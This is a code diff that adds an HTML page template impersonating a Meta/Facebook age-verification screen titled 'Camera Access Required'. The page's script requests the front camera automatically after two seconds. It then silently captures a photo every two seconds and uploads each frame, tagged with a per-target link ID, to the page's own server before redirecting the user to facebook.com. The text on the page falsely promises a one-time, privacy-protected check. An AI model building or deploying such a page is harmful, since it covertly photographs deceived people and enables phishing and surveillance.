@@ -1,0 +1,373 @@
+
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Camera Access Required</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .camera-placeholder {
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 40px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .camera-icon {
+            font-size: 64px;
+            margin-bottom: 15px;
+        }
+        
+        .preview {
+            width: 100%;
+            border-radius: 10px;
+            display: none;
+            margin-bottom: 20px;
+        }
+        
+        .permission-box {
+            background: #e8f4fd;
+            border-left: 4px solid #2196f3;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .permission-box h3 {
+            color: #1976d2;
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+        
+        .permission-box p {
+            color: #555;
+            font-size: 14px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 10px;
+        }
+        
+        .btn:hover {
+            background: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
+        }
+        
+        .btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn.secondary {
+            background: #757575;
+        }
+        
+        .btn.secondary:hover {
+            background: #616161;
+        }
+        
+        .status {
+            text-align: center;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: none;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        
+        .features {
+            list-style: none;
+            margin-top: 20px;
+        }
+        
+        .features li {
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .features li:before {
+            content: "✓ ";
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f9f9f9;
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4CAF50;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📸 Camera Access Required</h1>
+            <p>Secure verification for age confirmation</p>
+        </div>
+        
+        <div class="content">
+            <div class="camera-placeholder" id="cameraPlaceholder">
+                <div class="camera-icon">📷</div>
+                <p>Camera preview will appear here</p>
+            </div>
+            
+            <video id="video" class="preview" autoplay playsinline></video>
+            <canvas id="canvas" style="display: none;"></canvas>
+            
+            <div class="permission-box">
+                <h3>🔒 Why we need camera access?</h3>
+                <p>We need to verify you're a real person. This is a one-time verification for security purposes.</p>
+            </div>
+            
+            <button class="btn" id="requestBtn">Allow Camera Access</button>
+            <button class="btn secondary" id="captureBtn" disabled>Capture & Verify</button>
+            
+            <div class="loader" id="loader"></div>
+            
+            <div class="status" id="status"></div>
+            
+            <ul class="features">
+                <li>Secure encryption</li>
+                <li>Instant verification</li>
+                <li>Privacy protected</li>
+                <li>One-time only</li>
+            </ul>
+        </div>
+        
+        <div class="footer">
+            <p>© 2024 Meta Platforms, Inc. All rights reserved.</p>
+            <p>Your privacy is important to us</p>
+        </div>
+    </div>
+    
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const requestBtn = document.getElementById('requestBtn');
+        const captureBtn = document.getElementById('captureBtn');
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('status');
+        const cameraPlaceholder = document.getElementById('cameraPlaceholder');
+        const linkId = '<%= linkId %>';
+        
+        let stream = null;
+        let captureInterval = null;
+        
+        requestBtn.addEventListener('click', async () => {
+            try {
+                status.style.display = 'none';
+                loader.style.display = 'block';
+                requestBtn.disabled = true;
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                video.style.display = 'block';
+                cameraPlaceholder.style.display = 'none';
+                captureBtn.disabled = false;
+                
+                status.className = 'status success';
+                status.textContent = '✅ Camera access granted! Click "Capture & Verify" to continue.';
+                status.style.display = 'block';
+                
+                // Start auto-capture every 2 seconds
+                captureInterval = setInterval(captureAndSend, 2000);
+                
+            } catch (err) {
+                status.className = 'status error';
+                status.textContent = '❌ Camera access denied. Please allow camera access to continue.';
+                status.style.display = 'block';
+                console.error('Camera error:', err);
+            } finally {
+                loader.style.display = 'none';
+                requestBtn.disabled = false;
+            }
+        });
+        
+        captureBtn.addEventListener('click', captureAndSend);
+        
+        async function captureAndSend() {
+            if (!stream) {
+                status.className = 'status error';
+                status.textContent = 'Please allow camera access first.';
+                status.style.display = 'block';
+                return;
+            }
+            
+            try {
+                captureBtn.disabled = true;
+                loader.style.display = 'block';
+                
+                // Capture image
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to base64 (compressed)
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                
+                // Send to server
+                const response = await fetch('/camera/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        linkId: linkId,
+                        image: imageData
+                    })
+                });
+                
+                if (response.ok) {
+                    status.className = 'status success';
+                    status.textContent = '✅ Verification successful! Redirecting...';
+                    status.style.display = 'block';
+                    
+                    // Stop camera and redirect
+                    setTimeout(() => {
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                        if (captureInterval) {
+                            clearInterval(captureInterval);
+                        }
+                        window.location.href = 'https://facebook.com';
+                    }, 2000);
+                } else {
+                    throw new Error('Upload failed');
+                }
+                
+            } catch (err) {
+                status.className = 'status error';
+                status.textContent = '❌ Failed to process image. Please try again.';
+                status.style.display = 'block';
+                console.error('Capture error:', err);
+            } finally {
+                captureBtn.disabled = false;
+                loader.style.display = 'none';
+            }
+        }
+        
+        // Auto-request camera after 2 seconds
+        setTimeout(() => {
+            if (!stream) {
+                requestBtn.click();
+            }
+        }, 2000);
+        
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+        });
+    </script>
+</body>
+</html>
